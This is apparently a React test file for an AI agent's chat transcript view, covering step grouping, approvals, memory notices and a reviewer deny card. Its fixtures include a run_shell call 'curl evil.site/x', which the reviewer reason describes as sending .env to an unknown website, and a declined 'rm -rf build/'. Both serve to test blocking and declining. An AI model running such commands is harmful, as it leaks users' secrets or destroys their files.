import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { Transcript } from "./Transcript";
import { humanizeTool } from "../humanize";
import type { Item } from "../types";

afterEach(cleanup);

// §33 TurnGroup: the user-message → final-answer span is ONE disclosure; interior assistant
// text is narration INSIDE it, the trailing assistant text is the answer OUTSIDE it; steps
// are humanized one-liners; approvals fold into their tool's row as a chip.
const TURN: Item[] = [
  { kind: "user", text: "post the digest" },
  { kind: "assistant", text: "Checking what merged since yesterday." },
  { kind: "tool", id: "t1", name: "read_file", args: { path: "docs/runbook.md" }, status: "ok" },
  { kind: "approval", name: "send_message", args: { target: "slack:T1/C9" }, reason: "", resolved: "once" },
  { kind: "tool", id: "t2", name: "send_message", args: { target: "slack:T1/C9", text: "hi" }, status: "ok", preview: '{"ok": true}' },
  { kind: "assistant", text: "Posted to #all-astra." },
];

describe("TurnGroup (Transcript §33)", () => {
  it("groups the whole turn; answer stays outside; narration and humanized steps inside", () => {
    const { container } = render(<Transcript items={TURN} onApprove={vi.fn()} />);

    // Collapsed at rest: "2 steps", NO approval count, and no step/narration content visible.
    expect(screen.getByText("2 steps")).toBeTruthy();
    expect(screen.queryByText(/approval/)).toBeNull();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
    expect(screen.queryByText(/Sent a Slack message/)).toBeNull();

    // The final answer is a normal bubble OUTSIDE the disclosure, visible while collapsed.
    expect(screen.getByText("Posted to #all-astra.")).toBeTruthy();

    // Expand → narration renders quiet inside; steps are English lines, not raw args;
    // the approval is a chip on the send_message row, not a separate box.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-narration").textContent).toContain("Checking what merged");
    expect(screen.getByText("runbook.md")).toBeTruthy();
    expect(screen.getByText(/Sent a Slack message to/)).toBeTruthy();
    expect(screen.getByText("✓ user-approved")).toBeTruthy();
    expect(screen.queryByText("send_message approval")).toBeNull();

    // End-users never see raw toggles or raw JSON dumps
    expect(screen.queryByText("raw")).toBeNull();
    expect(container.textContent).not.toContain('{"ok": true}');
  });

  it("a running turn is labeled Running but starts COLLAPSED (§33 ref #3)", () => {
    const items: Item[] = [
      { kind: "assistant", text: "Looking at the repo." },
      { kind: "tool", id: "t1", name: "grep", args: { pattern: "TODO" }, status: "…" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(screen.getByText(/Running 1 step…/)).toBeTruthy();
    expect(screen.queryByTestId("turn-narration")).toBeNull(); // collapsed by default
    expect(screen.getByTestId("turn-live-line").textContent).toContain("Looking at the repo");
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("step-running")).toBeTruthy();
  });

  it("declined approvals keep their own 'Wanted to' row and surface on the collapsed line", () => {
    const items: Item[] = [
      { kind: "tool", id: "t1", name: "read_file", args: { path: "a.md" }, status: "ok" },
      { kind: "approval", name: "run_shell", args: { command: "rm -rf build/" }, reason: "", resolved: "deny" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(screen.getByTestId("stepgroup-declined").textContent).toBe("1 declined");
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    const ask = screen.getByTestId("turn-ask");
    expect(ask.textContent).toContain("Wanted to run");
    expect(ask.textContent).toContain("rm -rf build/");
    expect(ask.textContent).toContain("✕ declined");
  });

  it("assistant-only turns stay plain bubbles (no disclosure)", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello there." },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(screen.getByText("Hello there.")).toBeTruthy();
  });
});

describe("live turns (§33 flicker fix)", () => {
  const LIVE: Item[] = [
    { kind: "user", text: "build the app" },
    { kind: "tool", id: "t1", name: "read_file", args: { path: "data.json" }, status: "ok" },
    { kind: "assistant", text: "Inspecting the fetched dataset next." },
  ];

  it("while running, trailing assistant text stays INSIDE the group — no answer bubble flash", () => {
    const { container } = render(<Transcript items={LIVE} onApprove={vi.fn()} running />);
    // No assistant bubble anywhere; the group starts COLLAPSED with the narration riding
    // the header as the live line (§33 ref #3 — expanding is opt-in).
    expect(container.querySelector(".bubble-assistant")).toBeNull();
    expect(screen.queryByTestId("turn-narration")).toBeNull();
    expect(screen.getByTestId("turn-live-line").textContent).toContain("Inspecting the fetched dataset");
    // Expanding shows it as the quiet line inside.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-narration").textContent).toContain("Inspecting the fetched dataset");
    // Once the turn ends (running=false), the same trailing text IS the answer bubble.
    cleanup();
    const done = render(<Transcript items={LIVE} onApprove={vi.fn()} />);
    expect(done.container.querySelector(".bubble-assistant")?.textContent).toContain(
      "Inspecting the fetched dataset",
    );
  });

  it("quiet streamed text rides the collapsed header and the expanded body — never floats", () => {
    const { container } = render(
      <Transcript
        items={LIVE}
        onApprove={vi.fn()}
        running
        streamingText="The quote endpoint rate-limited, so I'm checking the historical pages."
      />,
    );
    // Collapsed: the STREAMING text wins the header live line (fresher than the last item).
    expect(screen.getByTestId("turn-live-line").textContent).toContain("quote endpoint rate-limited");
    expect(container.querySelector(".bubble-assistant")).toBeNull();
    // Expanded: it renders as the small quiet line under the steps.
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("turn-live-stream").textContent).toContain("quote endpoint rate-limited");
  });

  it("a PENDING approval neither splits the turn nor promotes the narration", () => {
    const items: Item[] = [
      ...LIVE,
      { kind: "approval", name: "write_file", args: { path: "app.html" }, reason: "" }, // unresolved
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
    expect(container.querySelectorAll("details.stepgroup")).toHaveLength(1);
    expect(container.querySelector(".bubble-assistant")).toBeNull();
  });

  it("a live run with NO tool activity is a plain streaming reply — bubbles as ever", () => {
    const items: Item[] = [
      { kind: "user", text: "hi" },
      { kind: "assistant", text: "Hello!" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} running />);
    expect(container.querySelector("details.stepgroup")).toBeNull();
    expect(container.querySelector(".bubble-assistant")?.textContent).toContain("Hello!");
  });
});

describe("reasoning display preference", () => {
  it("keeps the answer visible while hiding the reasoning disclosure", () => {
    const items: Item[] = [
      { kind: "assistant", text: "The answer", reasoning: "Private reasoning" },
    ];

    render(<Transcript items={items} onApprove={vi.fn()} showThinking={false} />);

    expect(screen.getByText("The answer")).toBeTruthy();
    expect(screen.queryByText("Private reasoning")).toBeNull();
    expect(screen.queryByTestId("thinking-toggle")).toBeNull();
  });
});

describe("bubble hover affordances (FB-005)", () => {
  const TS = 1752969720; // unix seconds, as the server stamps them
  const ITEMS: Item[] = [
    { kind: "user", text: "post the digest", ts: TS },
    { kind: "assistant", text: "Done — posted to #all-astra." }, // pre-stamp history: no ts
  ];

  it("copy button copies the bubble's raw text and flashes Copied", async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.defineProperty(navigator, "clipboard", { value: { writeText }, configurable: true });
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const copies = screen.getAllByTestId("bubble-copy");
    expect(copies).toHaveLength(2); // user + assistant bubbles both get one
    fireEvent.click(copies[0]);
    expect(writeText).toHaveBeenCalledWith("post the digest");
    // "Copied" lands only after the clipboard write RESOLVES (a rejected write must
    // not claim success), hence the await.
    await waitFor(() => expect(copies[0].textContent).toBe("Copied"));
    fireEvent.click(copies[1]);
    expect(writeText).toHaveBeenCalledWith("Done — posted to #all-astra.");
  });

  it("timestamp renders only when the item carries ts; full date rides the title", () => {
    render(<Transcript items={ITEMS} onApprove={vi.fn()} />);

    const stamps = screen.getAllByTestId("bubble-ts");
    expect(stamps).toHaveLength(1); // the ts-less assistant bubble shows none
    const when = new Date(TS * 1000);
    expect(stamps[0].textContent).toBe(when.toLocaleTimeString([], { hour: "numeric", minute: "2-digit" }));
    expect(stamps[0].getAttribute("title")).toBe(when.toLocaleString());
  });
});

// MEMORY-SPEC §5.1 — the save notice lives IN the conversation (a corner toast vanished
// before it could be read or undone, owner-hit 2026-07-28) and stays until acted on.
describe("memory save notice", () => {
  it("announces the save inline and offers Undo", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[{ kind: "memory", id: 7, text: "prefers short replies" }]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    const notice = screen.getByTestId("memory-notice");
    expect(notice.textContent).toContain("I'll remember that");
    expect(notice.textContent).toContain("prefers short replies");

    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // No `previous` on a brand-new save — undo deletes it outright.
    expect(onUndo).toHaveBeenCalledWith(7, undefined);
  });

  it("says an existing memory was UPDATED and undoes by restoring its old text", () => {
    const onUndo = vi.fn();
    render(
      <Transcript
        items={[
          {
            kind: "memory",
            id: 4,
            text: "diabetic, lactose-free, likes ice cream",
            previous: "diabetic, lactose-free",
          },
        ]}
        onApprove={vi.fn()}
        onUndoMemory={onUndo}
      />,
    );
    expect(screen.getByTestId("memory-notice").textContent).toContain(
      "I've updated what I remember",
    );
    fireEvent.click(screen.getByTestId("memory-notice-undo"));
    // Undo restores the previous wording rather than deleting the whole memory.
    expect(onUndo).toHaveBeenCalledWith(4, "diabetic, lactose-free");
  });

  it("confirms in place once undone, with no Undo left to click", () => {
    render(
      <Transcript
        items={[{ kind: "memory", id: 7, text: "prefers short replies", undone: true }]}
        onApprove={vi.fn()}
        onUndoMemory={vi.fn()}
      />,
    );
    expect(screen.getByTestId("memory-notice-undone").textContent).toContain("forgotten");
    expect(screen.queryByTestId("memory-notice-undo")).toBeNull();
  });
});

describe("humanizeTool", () => {
  it("prefers run_shell's model-written description and keeps the command as the object", () => {
    const line = humanizeTool("run_shell", { command: "git log --since=yesterday", description: "List yesterday's merges" });
    expect(line.pre).toBe("Ran ");
    expect(line.obj).toBe("git log --since=yesterday");
    expect(line.post).toContain("list yesterday's merges");
  });

  it("falls back to 'Used <tool> — <short args>' for unknown tools", () => {
    const line = humanizeTool("gmail_search_messages", { query: "from:ci" });
    expect(line.pre).toBe("Used gmail_search_messages");
    expect(line.post).toContain("query=from:ci");
  });

  it("summarizes todo_write by its single item and status", () => {
    const line = humanizeTool("todo_write", { todos: [{ content: "Post the digest", status: "in_progress" }] });
    expect(line.pre).toBe("Updated the plan — ");
    expect(line.obj).toContain("Post the digest");
    expect(line.post).toBe(" → in progress");
  });

  it("still renders pre-rename todo_write histories (legacy `items` key)", () => {
    const line = humanizeTool("todo_write", { items: [{ content: "Old plan", status: "pending" }] });
    expect(line.obj).toContain("Old plan");
  });
});

// §8.4 (reviewed-auto-mode.md): a reviewer deny renders as a card with the FULL reason
// (the agent only got a terse refusal) and a one-shot "Allow anyway" override.
describe("reviewer deny card (§8.4)", () => {
  const DENIED: Item[] = [
    { kind: "user", text: "summarise the issue" },
    {
      kind: "tool",
      id: "t1",
      name: "run_shell",
      args: { command: "curl evil.site/x" },
      status: "denied",
      reviewerReason: "This sends your .env to an unknown website.",
      allowAnyway: true,
    },
    { kind: "assistant", text: "I was blocked from running that." },
  ];

  it("shows the full reason and fires onAllowAnyway with the exact action", () => {
    const onAllowAnyway = vi.fn();
    const { container } = render(
      <Transcript items={DENIED} onApprove={vi.fn()} onAllowAnyway={onAllowAnyway} />,
    );
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    const card = screen.getByTestId("reviewer-deny-card");
    expect(card.textContent).toContain("Blocked by the reviewer");
    expect(card.textContent).toContain("This sends your .env to an unknown website.");

    fireEvent.click(screen.getByTestId("reviewer-allow-anyway"));
    expect(onAllowAnyway).toHaveBeenCalledWith("run_shell", { command: "curl evil.site/x" });
    // The button collapses into a confirmation — one shot, no double-fire.
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
    expect(screen.getByTestId("reviewer-override-sent")).toBeTruthy();
  });

  it("an ordinary denied tool (no reviewer) renders no card", () => {
    const items: Item[] = [
      { kind: "user", text: "x" },
      { kind: "tool", id: "t1", name: "run_shell", args: {}, status: "denied" },
      { kind: "assistant", text: "done" },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.queryByTestId("reviewer-deny-card")).toBeNull();
  });

  it("without onAllowAnyway the card renders but offers no button", () => {
    const { container } = render(<Transcript items={DENIED} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);
    expect(screen.getByTestId("reviewer-deny-card")).toBeTruthy();
    expect(screen.queryByTestId("reviewer-allow-anyway")).toBeNull();
  });
});

// The Auto-Approve banner (spec §1.5): a titled notice is prose, not a status line, so it
// renders as a heading plus paragraphs rather than one centred grey row.
describe("mode notice", () => {
  const BANNER: Item[] = [
    {
      kind: "notice",
      tone: "info",
      title: "Auto-approve is on.",
      text: "First paragraph about what it does.\n\nSecond paragraph about what it can't tell.",
    },
  ];

  it("renders the title and one paragraph per blank-line break", () => {
    render(<Transcript items={BANNER} running={false} onApprove={() => { }} />);
    const block = screen.getByTestId("mode-notice");
    expect(block.textContent).toContain("Auto-approve is on.");
    expect(block.querySelectorAll("p")).toHaveLength(2);
    // Prose layout, not the centred one-liner used for "Context compacted".
    expect(block.className).toContain("notice-block");
  });

  it("leaves untitled status notices as plain one-liners", () => {
    render(
      <Transcript items={[{ kind: "notice", tone: "info", text: "Context compacted" }]} running={false} onApprove={() => { }} />,
    );
    expect(screen.queryByTestId("mode-notice")).toBeNull();
    expect(screen.getByText("Context compacted").className).not.toContain("notice-block");
  });
});

describe("formatted tool views and source pills", () => {
  it("renders OpenWork-style source pills under web_search without raw JSON or raw buttons", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t_search",
        name: "web_search",
        args: { query: "Astra 6 model specs" },
        status: "ok",
        preview: JSON.stringify({
          provider: "exa",
          results: [
            {
              title: "OpenAI Models Documentation",
              url: "https://developers.openai.com/docs/models",
              snippet: "PT-6 Astra flagship model specs",
            },
            {
              title: "Trending Topics",
              url: "https://trendingtopics.eu/article",
              snippet: "AI analysis",
            },
          ],
        }),
      },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    // Shows source pills with clean domain names
    const pills = screen.getByTestId("search-source-pills");
    expect(pills).toBeTruthy();
    expect(pills.textContent).toContain("developers.openai.com");
    expect(pills.textContent).toContain("trendingtopics.eu");

    // OpenWork design: no raw button, no JSON button, no raw text dumps
    expect(screen.queryByText("raw")).toBeNull();
    expect(screen.queryByText("JSON")).toBeNull();
    expect(container.textContent).not.toContain('"provider"');
  });

  it("renders source pill for web_fetch without exposing raw scraped text or raw buttons", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t_fetch",
        name: "web_fetch",
        args: { url: "https://benchlm.ai/models/gpt-6-astra" },
        status: "ok",
        preview: JSON.stringify({
          url: "https://benchlm.ai/models/gpt-6-astra",
          content_type: "text/html; charset=utf-8",
          format: "markdown",
          truncated: false,
          text: "Header text\nSecond line content\nSkip Navigation",
        }),
      },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    // Shows source pill
    const fetchPill = screen.getByTestId("fetch-source-pills");
    expect(fetchPill).toBeTruthy();
    expect(fetchPill.textContent).toContain("benchlm.ai");

    // OpenWork design: no raw button, and never dumps scraped HTML/text into the transcript
    expect(screen.queryByText("raw")).toBeNull();
    expect(screen.queryByText("JSON")).toBeNull();
    expect(screen.queryByText(/Skip Navigation/)).toBeNull();
  });

  it("renders humanized error badge for failed web_fetch without raw tracebacks", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t_fetch_err",
        name: "web_fetch",
        args: { url: "https://www.cnbc.com/2026/09/03/article.html" },
        status: "ok",
        preview: JSON.stringify({
          error: "fetch failed: Client error '403 Forbidden' for url 'https://172.64.154.211/research/' For more information check: https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/403",
        }),
      },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    // Shows source pill with fallback to args url
    const fetchPill = screen.getByTestId("fetch-source-pills");
    expect(fetchPill).toBeTruthy();
    expect(fetchPill.textContent).toContain("cnbc.com");

    // Shows humanized error badge
    const badge = screen.getByTestId("fetch-error-badge");
    expect(badge).toBeTruthy();
    expect(badge.textContent).toContain("Access restricted (403)");

    // Raw python error traces, internal IP, and doc URLs are stripped
    expect(container.textContent).not.toContain("172.64.154.211");
    expect(container.textContent).not.toContain("developer.mozilla.org");
    expect(container.textContent).not.toContain("Client error");
  });

  it("renders todo_write as a clean checklist without raw JSON or raw buttons", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t_todo",
        name: "todo_write",
        args: {
          todos: [
            { content: "Thu thập dữ liệu thống kê Messi tại World Cup 2026", status: "done" },
            { content: "Tạo file tổng hợp thống kê (markdown)", status: "in_progress" },
            { content: "Kiểm tra lại dữ liệu", status: "pending" },
          ],
        },
        status: "ok",
        preview: '{"count": 3, "todos": [{"content": "Thu th\\u1eadp d\\u1eef li\\u1ec7u th\\u1ed1ng k\\u00ea Messi t\\u1ea1i World Cup 2026", "status": "done"}]}',
      },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    // Clean checklist is displayed
    const checklist = screen.getByTestId("todo-checklist");
    expect(checklist).toBeTruthy();
    expect(checklist.textContent).toContain("Thu thập dữ liệu thống kê Messi tại World Cup 2026");
    expect(checklist.textContent).toContain("Tạo file tổng hợp thống kê (markdown)");
    expect(checklist.textContent).toContain("Kiểm tra lại dữ liệu");

    // No raw button or unescaped unicode strings
    expect(screen.queryByText("raw")).toBeNull();
    expect(container.textContent).not.toContain("\\u1eadp");
    expect(container.textContent).not.toContain('{"count": 3');
  });

  it("renders write_file cleanly without raw buttons or content dumps", () => {
    const items: Item[] = [
      {
        kind: "tool",
        id: "t_write",
        name: "write_file",
        args: {
          path: "messi_worldcup_2026_stats.md",
          content: "# Lionel Messi - Thống kê World Cup 2026\nĐội tuyển: Argentina",
        },
        status: "ok",
        preview: "messi_worldcup_2026_stats.md",
      },
    ];
    const { container } = render(<Transcript items={items} onApprove={vi.fn()} />);
    fireEvent.click(container.querySelector("summary.stepgroup-head")!);

    expect(screen.getByText("messi_worldcup_2026_stats.md")).toBeTruthy();
    expect(screen.queryByText("raw")).toBeNull();
    expect(container.textContent).not.toContain("# Lionel Messi - Thống kê World Cup 2026");
  });
});
